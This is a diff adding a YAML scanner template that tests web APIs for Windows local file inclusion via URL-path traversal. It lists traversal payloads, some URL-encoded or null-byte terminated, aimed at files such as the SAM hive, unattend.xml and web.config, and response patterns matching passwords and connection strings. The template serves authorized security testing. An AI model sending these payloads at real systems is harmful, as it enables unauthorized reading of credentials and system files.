@@ -1,0 +1,110 @@
+id: LFI_IN_PATH_WINDOWS
+info:
+  name: "LFI in URL path for Windows"
+  description: "Local File Inclusion (LFI) in URL paths on Windows occurs when web applications allow users to specify file paths in the URL without proper validation or sanitization. Attackers can manipulate the URL to include sensitive files by using directory traversal sequences, such as `..\\`, leading to unauthorized access to files like system configurations or logs. This vulnerability can expose critical information and, in some cases, enable further exploitation, including remote code execution or privilege escalation." 
+  details: "Local File Inclusion (LFI) in URL paths for Windows arises when applications permit user input in file path parameters without adequate checks. Attackers can exploit this vulnerability by crafting URLs that leverage directory traversal patterns, allowing them to navigate the file system and access files outside the intended directory. Commonly targeted files include system configuration files, sensitive data, or application logs. If successful, this attack can reveal critical information and potentially lead to additional vulnerabilities, such as remote code execution."
+  impact: "The impact of Local File Inclusion (LFI) in URL paths on Windows can be significant, leading to unauthorized access to sensitive files such as configuration settings, user credentials, or log files. This exposure may result in data breaches, allowing attackers to gather critical information for further exploitation or privilege escalation. Additionally, if an attacker can include executable files or scripts, it may lead to remote code execution, potentially compromising the entire system and allowing full control over it."
+  category:
+    name: LFI
+    shortName: Local File Inclusion
+    displayName: Local File Inclusion (LFI)
+  subCategory: LFI_IN_PATH_WINDOWS
+  severity: HIGH
+  tags:
+    - Business logic
+    - OWASP top 10
+    - HackerOne top 10
+  references:
+    - "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion"
+    - "https://raw.githubusercontent.com/emadshanab/LFI-Payload-List/master/LFI%20payloads.txt"
+  cwe:
+    - CWE-98
+    - CWE-22
+  cve:
+    - CVE-2023-2453
+
+api_selection_filters:
+  method:
+    neq: "OPTIONS"
+  url:
+    extract: urlVar
+  response_payload:
+    length:
+      gt: 0
+
+wordLists:
+  filePaths: 
+    - "/boot.ini"
+    - "/inetpub/logs/logfiles"
+    - "/inetpub/wwwroot/global.asa"
+    - "/inetpub/wwwroot/index.asp"
+    - "/inetpub/wwwroot/web.config"
+    - "/sysprep.inf"
+    - "/sysprep.xml"
+    - "/sysprep/sysprep.inf"
+    - "/sysprep/sysprep.xml"
+    - "/system volume information/wpsettings.dat"
+    - "/system32/inetsrv/metabase.xml"
+    - "/unattend.txt"
+    - "/unattend.xml"
+    - "/unattended.txt"
+    - "/unattended.xml"
+    - "/windows/repair/sam"
+    - "/windows/repair/system"
+    - "../../../../../../windows/win.ini"
+    - "..%2F..%2F..%2F..%2Fwindows%2Fwin.ini"
+    - "%252e%252e%252f%252e%252e%252fwindows%252fwin.ini"
+    - "../../../../../../boot.ini"
+    - "..\\\\..\\\\..\\\\..\\\\windows\\\\win.ini"
+    - "../../../../../../inetpub/wwwroot/web.config"
+    - "../../../../../../inetpub/wwwroot/global.asa"
+    - "../../../../../../windows/system32/drivers/etc/hosts"
+    - "../../../../../../windows/win.ini%00.txt"
+
+execute:
+  type: single
+  requests:
+    - req:
+      - modify_url:
+          regex_replace:
+            regex: \/$
+            replace_with: ''
+      - modify_url: ${urlVar}/${filePaths}
+
+validate:
+  response_payload:
+    length:
+      gt: 0
+    contains_either:
+      - "[boot loader]"
+      - "[operating systems]"
+      - "multi(0)"
+      - "partition(1)"
+      - "timeout="
+      - "<SCRIPT LANGUAGE=VBScript RUNAT=Server>"
+      - "Application_OnStart"
+      - "Session_OnEnd"
+      - "ConnectionString"
+      - "Server.MapPath"
+      - "Request.QueryString"
+      - "Response.Write"
+      - "<connectionStrings>"
+      - "<appSettings>"
+      - "<authentication mode="
+      - "<authorization>"
+      - "<identity impersonate="
+      - "ProductKey="
+      - "AdminPassword="
+      - "FullName="
+      - "ComputerName="
+      - "<ProductKey>"
+      - "<AdministratorPassword>"
+      - "<ComputerName>"
+      - "<IISConfigObject>"
+      - "AdminACL"
+      - "AccessFlags"
+      - "C:\\Windows\\win.ini"
+      - "[windows]"
+      - "NullPort="
+      - "C:\\boot.ini"
+      - "multi(0)disk(0)rdisk(0)"
